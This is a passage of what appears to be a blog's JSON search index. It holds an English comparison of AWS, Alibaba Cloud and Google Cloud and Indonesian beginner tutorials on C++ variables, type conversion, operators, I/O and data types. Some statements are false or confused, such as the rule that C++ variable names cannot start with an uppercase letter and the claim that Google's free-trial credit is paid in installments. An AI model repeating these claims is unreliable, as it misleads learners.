it.Comparison of AWS, Alibaba Cloud, and other Google Cloud is an aspect of specification choice, because each user has different needs. AWS users can choose from 14 regions, the choice is wide enough so that users can maximize the services provided in it.Alibaba CloudNext is the Alibaba Cloud service, which is a service provided by the Alibaba platform with the ability to handle various types of agencies. It also features virtual server support, which makes it more compatible with existing systems.Alibaba Cloud’s coverage is considered narrower than other platforms, because it only provides regions in the Asian region, and a few places in the United States. Even for the South American region, Alibaba Cloud services are not available, so you need to consider using the region if you want to use Alibaba Cloud services.The price offered for services owned by Alibaba Cloud is actually not too expensive. For the cost per month is not more than 20 dollars, with a choice of rates that vary according to the needs used. However, when compared to other services, the prices offered by Alibaba Cloud tend to be higher.While in comparison to AWS, Alibaba Cloud, and Google Cloud price is important, don’t forget the quality of each available service. Prices tend to be high for Alibaba Cloud because the storage and CPU used are quite high, thus providing convenience for users.Then regarding storage, as a platform service in general, Alibaba Cloud has quite varied storage, from blocks, objects to files. Cold storage is also available for cost savings in the data storage process.Google Cloud PlatformLastly regarding the cloud platform provided by Google, which also provides cloud services for users who are interested in the latest fashion storage. For the price offered, the Google Cloud Platform service will provide a free trial service, but with a credit scheme of 300 dollars.With this price you can use all the services available on their cloud server and enjoy all the features. Credit as much as 300 dollars you do not have to pay in full, you can still pay it in installments with long-term use for 12 months.The next comparison of AWS, Alibaba Cloud, and Google Cloud is related to the services they have. Google Cloud in particular only provides invitations to users to take part in events hosted by Google. Sometimes the invitation is only reserved for new customers in certain cases.For those of you who use Google Cloud services, you can use the storage area evenly. There are 10 regions that can be used by users, for Indonesia, the closest server that can be used is Singapore. It also doesn’t provide any service or stack options, so you’ll have to create a new instance if you’re interested in using it.Those are various comparisons of AWS, Alibaba Cloud, and Google Cloud that you can learn. By comparing each aspect you have, you can find out more fully which platform suits your needs. Hopefully this information can help you, especially those who want to use the latest cloud storage services." }, { "title": "C++ Variable Literal dan constanta", "url": "/cpp-variable-literal-dan-constanta/", "categories": "Programming CPP, CPP Introduction, C++ variable Literal dan Constanta", "tags": "Programming, C++, variable, Literal, constanta, Integers, Floating-point Literals, Escape Sequences, String Literal", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang variable, literal, dan Const dalam C++ dengan contoh.C++ variableDalam pemrograman, variable adalah wadah (area penyimpanan) untuk menampung data.Untuk menunjukkan area penyimpanan, setiap variableharus diberi nama unik (identifier). Sebagai contoh,int usia = 14;Di Sini, usia adalah variable dari int tipe data, dan kami telah menetapkan nilai integer 14 untuk itu. Catatan: int tipe data menunjukkan bahwa variable hanya bisa menampung integers. Demikian pula, kita dapat menggunakan double tipe data jika kita harus menyimpan decimal dan exponential.Kita akan belajar tentang semua tipe data secara rinci dalam tutorial berikutnya.Nilai variable dapat diubah, maka nama variable.int usia = 14; // usia 14usia = 17; // usia 17Aturan untuk penamaan variable Nama variable hanya boleh memiliki huruf, angka, dan garis bawah _. Nama variable tidak boleh diawali dengan angka. Nama variable tidak boleh dimulai dengan karakter huruf besar. Nama variable tidak boleh berupa kata kunci . Misalnya, int adalah kata kunci yang digunakan untuk menunjukkan integer. Nama variable dapat dimulai dengan garis bawah. Namun, itu tidak dianggap sebagai praktik yang baik. Catatan: Kita harus mencoba memberi nama yang bermakna pada variable. Sebagai contoh,nama depan adalah nama variable yang lebih baik daripada fn. C++ LiteralLiteral adalah data yang digunakan untuk mewakili nilai tetap. Mereka dapat digunakan langsung dalam code. Contoh: 1, 2.5, &#39;c&#39;dst.Di sini, 1, 2.5 dan &#39;c&#39;adalah literal. Mengapa? Anda tidak dapat menetapkan nilai yang berbeda untuk istilah ini.Berikut daftar literal yang berbeda dalam pemrograman C++.IntegersInteger adalah literal numeric (terkait dengan angka) tanpa bagian pecahan atau exponential. Ada tiga jenis literal integer dalam pemrograman C: decimal (basis 10) octal (basis 8) hexadecimal (basis 16)Sebagai contoh:Decimal: 0, -9, 22 dstOctal: 021, 077, 033 dsthexadecimal: 0x7f, 0x2a, 0x521 dllDalam pemrograman C++, octal dimulai dengan 0, dan hexadecimal dimulai dengan 0x.Floating-point LiteralsFloating-point Literals adalah literal numeric yang memiliki bentuk pecahan atau bentuk exponential. Sebagai contoh: -2.0 0.0000234 -0.22E-5 Catatan: E-5 = 10-5karakterkarakters literal dibuat dengan melampirkan satu karakter di dalam tanda kutip tunggal. Misalnya: &#39;a&#39;, &#39;m&#39;, &#39;F&#39;, &#39;2&#39;,&#39;}&#39;dst.Escape SequencesTerkadang, perlu menggunakan karakter yang tidak bisa diketik atau memiliki arti khusus dalam pemrograman C++. Misalnya, baris baru (enter), tab, tanda tanya, dll.Untuk menggunakan karakter ini, sequence runner digunakan. Escape Sequences karakters \\b Backspace \\f Form feed \\n Newline \\r Return \\t Horizontal tab \\v Vertical tab \\\\ Backslash \\&#39; Single quotation mark \\&quot; Double quotation mark \\? Question mark \\0 Null karakter String LiteralLiteral string adalah urutan karakter yang diapit oleh tanda kutip ganda. Sebagai contoh: Escape order karakter &quot;Omaigot&quot; string const &quot;&quot; null string const &quot; &quot; string const enam spasi &quot;x&quot; string const memiliki karakter tunggal &quot;Bumi itu bulat\\n&quot; print string dengan baris baru Kita akan belajar tentang string secara rinci dalam tutorial string C++.C++ ConstantaDalam C++, kita dapat membuat variable yang nilainya tidak dapat diubah. Untuk itu, kami menggunakan kata kunci const. Berikut ini contohnya:const int LIGHT_SPEED = 299792458;LIGHT_SPEED = 2500 // Error! LIGHT_SPEED is a constant.Di sini, kita telah menggunakan kata kunci const untuk mendeklarasikan sebuah const bernama LIGHT_SPEED. Jika kita mencoba mengubah nilai LIGHT_SPEED, kita akan mendapatkan kesalahan.const juga dapat dibuat menggunakan #define preprocessor directive." }, { "title": "C++ Type Conversion", "url": "/cpp-type-conversion/", "categories": "Programming CPP, CPP Introduction, Type Conversion", "tags": "Programming, C++, Implicit, Explicit, style casting, Function Casting, Conversion Operators, static cast, dynamic_cast, const cast, reinterpret cast", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang dasar-dasar conversion type C++ dengan contoh.C++ memungkinkan kita untuk mengconversi data dari satu type ke type lainnya. Ini dikenal sebagai type conversion.Ada dua jenis type conversion di C++. Implicit Type Conversion type conversion (juga dikenal sebagai Type Casting)Implicit Type Conversiontype Conversion yang dilakukan secara otomatis oleh compiler dikenal sebagai type conversion implisit. Jenis Conversion ini juga dikenal sebagai konversi otomatis.Mari kita lihat dua contoh konversi tipe implisit.Contoh 1: Konversi Dari int ke double// Bekerja dari implicit type-conversion#include &amp;lt;iostream&amp;gt;using namespace std;int main() { // menetapkan nilai int ke num_int int num_int = 9; // mendeklarasikan variable type ganda double num_double; // implicit conversion // menetapkan nilai int ke variable ganda num_double = num_int; cout &amp;lt;&amp;lt; &quot;num_int = &quot; &amp;lt;&amp;lt; num_int &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &quot;num_double = &quot; &amp;lt;&amp;lt; num_double &amp;lt;&amp;lt; endl; return 0;}Outputnum_int = 9 num_double = 9Dalam program, menetapkan data int ke double variable.num_double = num_int;Di sini, nilai int secara otomatis dikonversi oleh double compiler sebelum ditetapkan ke to num_double variable. Ini adalah contoh type conversion implisit.Contoh 2: conversi Otomatis dari double ke int// Bekerja dari Implicit type-conversion#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int num_int; double num_double = 9.99; // implicit conversion // menetapkan nilai ganda ke variable int num_int = num_double; cout &amp;lt;&amp;lt; &quot;num_int = &quot; &amp;lt;&amp;lt; num_int &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &quot;num_double = &quot; &amp;lt;&amp;lt; num_double &amp;lt;&amp;lt; endl; return 0;}Outputnum_int = 9 num_double = 9,99Dalam program, telah menetapkan data double ke variable int.num_double = num_int;Di sini, nilai double secara otomatis dikonversi oleh int compiler sebelum ditetapkan ke to variable num_int. Ini juga merupakan contoh type conversion implisit. Catatan: Karena int tidak dapat memiliki bagian decimal, num setelah titik decimal terpotong dalam contoh di atas.Kehilangan Data Selama conversion (Narrowing Conversion)Seperti yang telah kita lihat dari contoh di atas, conversi dari satu type data ke type data lainnya rentan kehilangan data. Ini terjadi ketika data dari type yang lebih besar diconversi ke data dari type yang lebih kecil.C++ Explicit ConversionSaat user secara manual mengubah data dari satu jenis ke jenis lainnya, ini dikenal sebagai Conversion eksplisit. Jenis Conversi ini juga dikenal sebagai type casting.Ada tiga cara utama di mana kita dapat menggunakan Conversi eksplisit dalam C++: C-style type casting (also known as cast notation) Function notation (dikenal sebgai type casting) Type conversion operatorsC-style Type CastingSeperti namanya, jenis ini casting disukai oleh bahasa pemrograman C. Hal ini juga dikenal sebagai cast notation.Syntax untuk style ini adalah:(data_type)expression;Sebagai contoh,// menginisialisasi variable intint num_int = 26;// mendeklarasikan variabel gandadouble num_double;// conversi dari int ke doublenum_double = (double)num_int;Function-style CastingKita juga dapat menggunakan fungsi seperti notasi untuk mentransmisikan data dari satu type ke type lainnya.Syntax untuk style ini adalah:data_type(expression);Sebagai contoh,// menginisialisasi variable intint num_int = 26;// mendeklarasikan variable gandadouble num_double;// conversi dari int ke doublenum_double = double(num_int);Contoh 3: Type Casting#include &amp;lt;iostream&amp;gt;using namespace std;int main() { // menginisialisasi variable ganda double num_double = 3.56; cout &amp;lt;&amp;lt; &quot;num_double = &quot; &amp;lt;&amp;lt; num_double &amp;lt;&amp;lt; endl; // C-style conversion dari double ke int int num_int1 = (int)num_double; cout &amp;lt;&amp;lt; &quot;num_int1 = &quot; &amp;lt;&amp;lt; num_int1 &amp;lt;&amp;lt; endl; // function-style conversion dari double ke int int num_int2 = int(num_double); cout &amp;lt;&amp;lt; &quot;num_int2 = &quot; &amp;lt;&amp;lt; num_int2 &amp;lt;&amp;lt; endl; return 0;}Outputnum_double = 3,56 num_int1 = 3 num_int2 = 3menggunakan C style type conversion dan function-style casting untuk type conversi dan menampilkan hasilnya. Karena mereka melakukan tugas yang sama, keduanya memberi kita output yang sama.Type Conversion OperatorsSelain dua jenis ini, C++ juga memiliki empat operator untuk jenis conversi. Mereka dikenal sebagai Type Conversion Operators: static_cast dynamic_cast const_cast reinterpret_cast" }, { "title": "C++ Operators", "url": "/cpp-operators/", "categories": "Programming CPP, CPP Introduction, C++ Operators", "tags": "Programming, C++, variable, Divisi, Arithmetic, Integers, Floating-point, Tambah, Modul, Assignment, Relational, Bitwise, Logical", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang berbagai jenis operator di C++ dengan contoh. Dalam pemrograman, operator adalah symbol yang beroperasi pada nilai atau variable.Operator adalah symbol yang melakukan operasi pada variable dan nilai. Misalnya, + adalah operator yang digunakan untuk penjumlahan, sedangkan - adalah operator yang digunakan untuk pengurangan.Operator dalam C++ dapat diklasifikasikan menjadi 6 jenis: Arithmetic Operators Assignment Operators Relational Operators Logical Operators Bitwise Operators Operators Lainnya1. C++ Operator ArithmeticOperator aritmatika digunakan untuk melakukan operasi Arithmetic pada variabel dan data. Sebagai contoh,a + b;Di sini, operator + digunakan untuk menambahkan dua variable A dan B. Demikian pula ada berbagai operator Arithmetic lainnya di C++. Operator Operasi + Tambahan - Pengurangan * Perkalian / Divisi % Operasi Modul (Sisa setelah pembagian) Contoh 1: Operator Arithmetic#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int a, b; a = 7; b = 2; // print jumlah a dan b cout &amp;lt;&amp;lt; &quot;a + b = &quot; &amp;lt;&amp;lt; (a + b) &amp;lt;&amp;lt; endl; // print selisih a dan b cout &amp;lt;&amp;lt; &quot;a - b = &quot; &amp;lt;&amp;lt; (a - b) &amp;lt;&amp;lt; endl; // print hasil kali a dan b cout &amp;lt;&amp;lt; &quot;a * b = &quot; &amp;lt;&amp;lt; (a * b) &amp;lt;&amp;lt; endl; // print pembagian a dengan b cout &amp;lt;&amp;lt; &quot;a / b = &quot; &amp;lt;&amp;lt; (a / b) &amp;lt;&amp;lt; endl; // print sisa bagi dari a oleh b cout &amp;lt;&amp;lt; &quot;a % b = &quot; &amp;lt;&amp;lt; (a % b) &amp;lt;&amp;lt; endl; return 0;}Outputa + b = 9a - b = 5a * b = 14a / b = 3a% b = 1Di sini, operator +, - dan * menghitung penambahan, pengurangan, dan perkalian masing-masing seperti yang kita harapkan.C++ Operator Divisi /Perhatikan operasi (a / b) dalam program. oprator / adalah operator divisi.Seperti yang dapat kita lihat dari contoh di atas, jika sebuah integer dibagi dengan integer lainnya, kita akan mendapatkan hasil bagi. Namun, jika pembagi atau divisi adalah bilangan floating-point, kita akan mendapatkan hasilnya dalam decimal.Dalam C++,7/2 adalah 37.0 / 2 adalah 3.57 / 2.0 adalah 3.57.0 / 2.0 adalah 3.5C++ Operator Sisa Bagi %Operator Sisa bagi % menghitung sisanya. Ketika a = 9 dibagi dengan b = 4, sisanya adalah 1. Catatan: Operator % hanya dapat digunakan dengan Integer.C++ Operator Penambahan dan pengurangan + -C++ juga menyediakan operator Penambahan dan pengurangan : ++ dan -- masing - masing. ++ meningkatkan nilai operator sebesar 1 -- berkurang 1Sebagai contoh,int num = 5;// operator tambah++num; // 6Di sini, code ++ num; menambahkan nilai 1 num.Contoh 2: Operator Penambahan dan pengurangan// Bekerja di operator penambahan dan pengurangan#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int a = 10, b = 100, result_a, result_b; // menambah a dengan 1 dan menyimpan hasilnya di result_a result_a = ++a; cout &amp;lt;&amp;lt; &quot;result_a = &quot; &amp;lt;&amp;lt; result_a &amp;lt;&amp;lt; endl; // mengurangi b dengan 1 dan menyimpan hasilnya di result_b result_b = --b; cout &amp;lt;&amp;lt; &quot;result_b = &quot; &amp;lt;&amp;lt; result_b &amp;lt;&amp;lt; endl; return 0;}Outputresult_a = 11result_b = 99Dalam program di atas, kita telah menggunakan operator ++ dan -- sebagai awalan (++a dan --b). Namun, kita juga dapat menggunakan operator ini sebagai postfix (a++ dan b--).2. C++ Operators AssignmentDalam C++, operator Assignment digunakan untuk menetapkan nilai ke variable. Sebagai contoh,// assign 5 ke aa = 5;Di sini, kita telah menetapkan nilai 5 ke sebuah variable. Operator Contoh Setara dengan = a = b; a = b; += a += b; a = a + b; -= a -= b; a = a - b; *= a *= b; a = a * b; /= a /= b; a = a / b; %= a %= b; a = a % b; Contoh 3: Operator Assignment#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int a, b; // 2 ditugaskan ke a a = 2; // 7 ditugaskan ke b b = 7; cout &amp;lt;&amp;lt; &quot;a = &quot; &amp;lt;&amp;lt; a &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &quot;b = &quot; &amp;lt;&amp;lt; b &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &quot;\\nSetelah a += b;&quot; &amp;lt;&amp;lt; endl; // menugaskan jumlah a dan b ke a a += b; // a = a +b cout &amp;lt;&amp;lt; &quot;a = &quot; &amp;lt;&amp;lt; a &amp;lt;&amp;lt; endl; return 0;}Outputa = 2 b = 7 Setelah a += b; a = 93. C++ Operators RelationalOperator Relational digunakan untuk memeriksa hubungan antara dua operan. Sebagai contoh,// memeriksa apakah a lebih besar dari ba &amp;gt; b;Di sini, &amp;gt; adalah operator relasional. yang memeriksa apakah a lebih besar dari B atau tidak.Jika relasinya true, ia mengembalikan 1 sedangkan jika hubungan itu false, ia mengembalikan 0. Operator Berarti Contoh == Adalah sama dengan 3 == 5 memberi kita false != Tidak sebanding dengan 3 != 5 memberi kita true &amp;gt; Lebih besar dari 3 &amp;gt; 5 memberi kita false &amp;lt; Kurang dari 3 &amp;lt; 5 memberi kita true &amp;gt;= Lebih dari atau sama dengan 3 &amp;gt;= 5 beri kami false &amp;lt;= Kurang dari atau Sama Dengan 3 &amp;lt;= 5 memberi kita true Contoh 4: C++ Operator Relasional#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int a, b; a = 3; b = 5; bool result; result = (a == b); // false cout &amp;lt;&amp;lt; &quot;3 == 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (a != b); // true cout &amp;lt;&amp;lt; &quot;3 != 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = a &amp;gt; b; // false cout &amp;lt;&amp;lt; &quot;3 &amp;gt; 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = a &amp;lt; b; // true cout &amp;lt;&amp;lt; &quot;3 &amp;lt; 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = a &amp;gt;= b; // false cout &amp;lt;&amp;lt; &quot;3 &amp;gt;= 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = a &amp;lt;= b; // true cout &amp;lt;&amp;lt; &quot;3 &amp;lt;= 5 adalah &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; return 0;}Output3 == 5 adalah 0 3 != 5 adalah 1 3 &amp;gt; 5 adalah 0 3 &amp;lt; 5 adalah 1 3 &amp;gt;= 5 adalah 0 3 &amp;lt;= 5 adalah 1Catatan : Operator relasional digunakan dalam pengambilan keputusan dan perulangan atau dikenal dengan looping.4. C++ Logical OperatorsOperator logika digunakan untuk memeriksa apakah true atau **false. Jika ekspresinya true, ia mengembalikan 1 sedangkan jika ekspresinya false , ia mengembalikan 0. Operator Contoh Berarti &amp;amp;&amp;amp; ekspresi1 &amp;amp;&amp;amp; ekspresi2 logical AND. true hanya jika semua operan true. | | ekspresi1 | | ekspresi2 logical OR. true jika setidaknya salah satu operan benar. ! ! ekspresi Logical NOT. true hanya jika operan false. Dalam C++, operator logika biasanya digunakan dalam pengambilan keputusan. Untuk lebih memahami operator logika, mari kita lihat contoh berikut,Suppose,a = 5b = 8Then,(a &amp;gt; 3) &amp;amp;&amp;amp; (b &amp;gt; 5) mengevaluasi ke true(a &amp;gt; 3) &amp;amp;&amp;amp; (b &amp;lt; 5) mengevaluasi ke false(a &amp;gt; 3) || (b &amp;gt; 5) mengevaluasi ke true(a &amp;gt; 3) || (b &amp;lt; 5) mengevaluasi ke true(a &amp;lt; 3) || (b &amp;lt; 5) mengevaluasi ke false!(a &amp;lt; 3) mengevaluasi ke true!(a &amp;gt; 3) mengevaluasi ke falseContoh 5: Logical Operators#include &amp;lt;iostream&amp;gt;using namespace std;int main() { bool result; result = (3 != 5) &amp;amp;&amp;amp; (3 &amp;lt; 5); // true cout &amp;lt;&amp;lt; &quot;(3 != 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (3 == 5) &amp;amp;&amp;amp; (3 &amp;lt; 5); // false cout &amp;lt;&amp;lt; &quot;(3 == 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (3 == 5) &amp;amp;&amp;amp; (3 &amp;gt; 5); // false cout &amp;lt;&amp;lt; &quot;(3 == 5) &amp;amp;&amp;amp; (3 &amp;gt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (3 != 5) || (3 &amp;lt; 5); // true cout &amp;lt;&amp;lt; &quot;(3 != 5) || (3 &amp;lt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (3 != 5) || (3 &amp;gt; 5); // true cout &amp;lt;&amp;lt; &quot;(3 != 5) || (3 &amp;gt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = (3 == 5) || (3 &amp;gt; 5); // false cout &amp;lt;&amp;lt; &quot;(3 == 5) || (3 &amp;gt; 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = !(5 == 2); // true cout &amp;lt;&amp;lt; &quot;!(5 == 2) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; result = !(5 == 5); // false cout &amp;lt;&amp;lt; &quot;!(5 == 5) is &quot; &amp;lt;&amp;lt; result &amp;lt;&amp;lt; endl; return 0;}Output(3 != 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) adalah 1 (3 == 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) adalah 0 (3 == 5) &amp;amp;&amp;amp; (3 &amp;gt; 5) adalah 0 (3 != 5) || (3 &amp;lt; 5) adalah 1 (3 != 5) || (3 &amp;gt; 5) adalah 1 (3 == 5) || (3 &amp;gt; 5) adalah 0 !(5 == 2) adalah 1 !(5 == 5) adalah 0Penjelasan program operator logical (3 != 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) mengevaluasi ke 1 karena kedua operan (3 != 5) dan (3 &amp;lt; 5) yang 1 (true). (3 == 5) &amp;amp;&amp;amp; (3 &amp;lt; 5) mengevaluasi ke 0 karena operan (3 == 5) adalah 0 (false). (3 == 5) &amp;amp;&amp;amp; (3 &amp;gt; 5) mengevaluasi ke 0 karena kedua operan (3 == 5) dan (3 &amp;gt; 5) yang 0 (false). (3 != 5) || (3 &amp;lt; 5) mengevaluasi ke 1 karena kedua operan (3 != 5) dan (3 &amp;lt; 5) yang 1 (true). (3 != 5) || (3 &amp;gt; 5) mengevaluasi ke 1 karena operan (3 != 5) adalah 1 (true). (3 == 5) || (3 &amp;gt; 5) mengevaluasi ke 0 karena kedua operan (3 == 5) dan (3 &amp;gt; 5) yang 0 (false). !(5 == 2) mengevaluasi ke 1 karena operan (5 == 2) adalah 0 (false). !(5 == 5) mengevaluasi ke 0 karena operan (5 == 5) adalah 1 (true).5. C++ Operators BitwiseDalam C++, operator bitwise digunakan untuk melakukan operasi pada bit individu. hanya dapat digunakan bersama char dan type int data. Operator Keterangan &amp;amp; Binary AND | Binary OR ^ Binary XOR ~ Komplemen Binary Satu &amp;lt;&amp;lt; Shift Binary ke Kiri &amp;gt;&amp;gt; Shift Binary Kanan Untuk mempelajari lebih lanjut, kunjungi operator bitwise C++ .6. C++ Operators LainnyaBerikut daftar beberapa operator umum lainnya yang tersedia di C++. Kita akan mempelajarinya di tutorial selanjutnya. Operator Keterangan Contoh sizeof mengembalikan ukuran type data sizeof(int); // 4 ?: mengembalikan nilai berdasarkan kondisi string result = (5 &amp;gt; 0) ? &quot;even&quot; : &quot;odd&quot;; // &quot;even&quot; &amp;amp; mewakili alamat memori operan &amp;amp;num; // address of num . mengakses anggota variable struct atau object class s1.marks = 92; -&amp;gt; digunakan dengan pointer untuk mengakses class atau variable struct ptr-&amp;gt;marks = 92; &amp;lt;&amp;lt; mencetak nilai keluaran cout &amp;lt;&amp;lt; 5; &amp;gt;&amp;gt; mendapatkan nilai input cin &amp;gt;&amp;gt; num; " }, { "title": "C++ Input dan Output", "url": "/cpp-input-dan-output/", "categories": "Programming CPP, CPP Introduction, Input dan Output", "tags": "Programming, C++, Input, output, string output, string Input, Characters Output, Integer Input, Integer Output, Multiple Inputs, cin, cout, num", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar menggunakan object cin untuk mengambil input dari user, dan object cout untuk menampilkan output kepada user dengan contoh.C++ OutputDalam C++, cout mengirimkan output yang diformat ke perangkat output standar, seperti layar. Kami menggunakan object cout bersama dengan operator &amp;lt;&amp;lt; untuk menampilkan output.Contoh 1: string output#include &amp;lt;iostream&amp;gt;using namespace std;int main() { // print string yang diapit tanda kutip ganda cout &amp;lt;&amp;lt; &quot;Ini Pemrograman C++++&quot;; return 0;}OutputIni Pemrograman C++++Bagaimana cara kerja program ini? pertama-tama menyertakan iostream file header yang memungkinkan menampilkan output. cout object ditentukan dalam std namespace. Untuk menggunakan std namespace, menggunakan pernyataan using namespace std;. Setiap program C++ dimulai dengan fungsi main(). ekesekusi code dimulai dari awal fungsi main(). cout adalah object yang mencetak string di dalam tanda kutip &quot; &quot;. Hal ini diikuti oleh operator &amp;lt;&amp;lt;. return 0; adalah “status keluar” dari fungsi main(). Program diakhiri dengan pernyataan ini, namun pernyataan tidak wajib. Catatan: Jika kita tidak menyertakan pernyataan using namespace std;, kita perlu menggunakan std::cout sebagai ganti cout.Ini adalah metode yang disukai karena menggunakan std namespace dapat menimbulkan masalah.Namun, kita telah menggunakan std namespace dalam tutorial untuk membuat code lebih mudah dibaca.#include &amp;lt;iostream&amp;gt;int main() { // string yang tanda kutip ganda std::cout &amp;lt;&amp;lt; &quot;Ini Pemrograman C++++&quot;; return 0;}Contoh 2: Output Angka dan CharacterUntuk mencetak variable angka dan Character, kita menggunakan object cout yang sama tetapi tanpa menggunakan tanda petik.#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int num1 = 70; double num2 = 256.783; char ch = &#39;A&#39;; cout &amp;lt;&amp;lt; num1 &amp;lt;&amp;lt; endl; // print integer cout &amp;lt;&amp;lt; num2 &amp;lt;&amp;lt; endl; // print double cout &amp;lt;&amp;lt; &quot;character: &quot; &amp;lt;&amp;lt; ch &amp;lt;&amp;lt; endl; // print char return 0;}Output70256.783Character: A Catatan:manipulator endl digunakan untuk menyisipkan baris baru. Itu sebabnya setiap output ditampilkan di baris baru.operator &amp;lt;&amp;lt; dapat digunakan lebih dari sekali jika kita ingin mencetak variable yang berbeda, string dan sebagainya dalam sebuah pernyataan tunggal.Sebagai contoh:C++cout &amp;lt;&amp;lt; &quot;character: &quot; &amp;lt;&amp;lt; ch &amp;lt;&amp;lt; endl;C++ InputDalam C++, cin mengambil input yang diformat dari perangkat input standar seperti keyboard. menggunakan object cin bersama dengan operator &amp;gt;&amp;gt; untuk mengambil input.Contoh 3: Input/Output Integer#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int num; cout &amp;lt;&amp;lt; &quot;Masukkan sebuah integer: &quot;; cin &amp;gt;&amp;gt; num; // mangambil input cout &amp;lt;&amp;lt; &quot;num adalah: &quot; &amp;lt;&amp;lt; num; return 0;}OutpputMasukkan sebuah integer: 70num adalah: 70Dalam program, menggunakancin &amp;gt;&amp;gt; num;untuk menerima input dari user. Input disimpan dalam variable num. menggunakan operator &amp;gt;&amp;gt; dengan cin untuk mengambil input. Catatan: Jika kita tidak menyertakan pernyataan using namespace std; kita perlu menggunakan std::cin sebagai ganti cin.C++ Mengambil Banyak Input#include &amp;lt;iostream&amp;gt;using namespace std;int main() { char a; int num; cout &amp;lt;&amp;lt; &quot;Masukkan characters dan integers: &quot;; cin &amp;gt;&amp;gt; a &amp;gt;&amp;gt; num; cout &amp;lt;&amp;lt; &quot;Character: &quot; &amp;lt;&amp;lt; a &amp;lt;&amp;lt; endl; cout &amp;lt;&amp;lt; &quot;Number: &quot; &amp;lt;&amp;lt; num; return 0;}OutputMasukkan characters dan integers: F23characters: Fnumber: 23" }, { "title": "C++ Data Types", "url": "/cpp-data-types/", "categories": "Programming CPP, CPP Introduction, Data Types", "tags": "Programming, C++, type Data Dasar, int, float, double, Character, wchar_t, bool, void, modifiers, Turunan", "date": "2021-07-26 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang type data dasar seperti int, float, char, dll dalam pemrograman C++.Dalam C++, type data adalah declaration untuk variable. Untuk menentukan jenis dan ukuran data yang terkait dengan variable. Sebagai contoh,int usia = 13;Di Sini, usia adalah variable type int. Artinya, variable hanya dapat menyimpan Integer baik 2 atau 4 byte.C++ Data type DasarTabel di bawah ini menunjukkan type data dasar, artinya, dan ukurannya (dalam byte): type data Berarti (dalam Byte) int Integer 2 atau 4 float floating-point 4 double Double Floating Point 8 char Character 1 wchar_t Wide Character 2 bool Boolean 1 void Empty 0 Sekarang, mari kita bahas type data fundamental ini secara lebih rinci.C++ intKata kunci int digunakan untuk menunjukkan Integer.Ukurannya biasanya 4 byte. Artinya, dapat menyimpan nilai dari -2147483648 hingga 2147483647.Sebagai contoh,int gaji = 85000;C++ float dan double float dan double digunakan untuk menyimpan bilangan floating-point (decimal dan eksponensial). Ukurannya float adalah 4 byte dan ukurannya double adalah 8 byte. Oleh karena itu, double memiliki dua kali presisi float.Sebagai contohfloat area = 64.74;double volume = 134.64534;Seperti disebutkan di atas, kedua type data ini juga digunakan untuk eksponensial. Sebagai contoh,double distance = 45E12 // 45E12 adalah sama dengan 45*10^12C++ Character Kata kunci char digunakan untuk Character. Ukurannya adalah 1 byte. Character dalam C++ diapit di dalam tanda kutip tunggal ‘ ‘.Sebagai contohchar test = &#39;h&#39;; Catatan: Dalam C++, nilai integer disimpan dalam char variable dari.C++ wchar_t Character lebar char_t mirip dengan chartype data, kecuali ukurannya 2 byte, bukan 1. digunakan untuk mewakili Character yang membutuhkan lebih banyak memori untuk mewakilinya daripada satu char.Sebagai contohwchar_t test = L&#39;ם&#39; // menyimpan character Hebrew;Perhatikan huruf L sebelum tanda petik. Catatan: Ada juga dua type character ukuran tetap lainnya char16_t dan char32_t diperkenalkan di C++ 11.C++ bool bool type data memiliki salah satu dari dua kemungkinan nilai: true atau false. Boolean digunakan dalam pernyataan dan loop conditionalSebagai contohbool cond = false;C++ void Kata kuncivoid menunjukkan tidak adanya data. Itu berarti “tidak ada” atau “tidak ada nilai”. Kita akan menggunakan void ketika kita belajar tentang fungsi dan pointer. Catatan: Kami tidak dapat mendeklarasikan variable void bertype.C++ Type Modifiersselanjutnya dapat memodifikasi beberapa type data dasar dengan menggunakan modifier type. Ada 4 jenis pengubah di C++. 1 signed 2 unsigned 3 short 4 longKita dapat memodifikasi type data berikut dengan modifiers di atas: int double charDaftar Type Data yang Di modifikasi C++ Type data Ukuran (Byte) Berarti signed int 4 digunakan untuk bilangan bulat (setara dengan int) unsigned int 4 hanya dapat menyimpan bilangan bulat positif short 2 digunakan untuk integer kecil (range -32768 hingga 32767) unsigned short 2 digunakan untuk bilangan bulat positif kecil (range 0 hingga 65.535) long setidaknya 4 digunakan untuk integer besar (setara dengan long int) unsigned 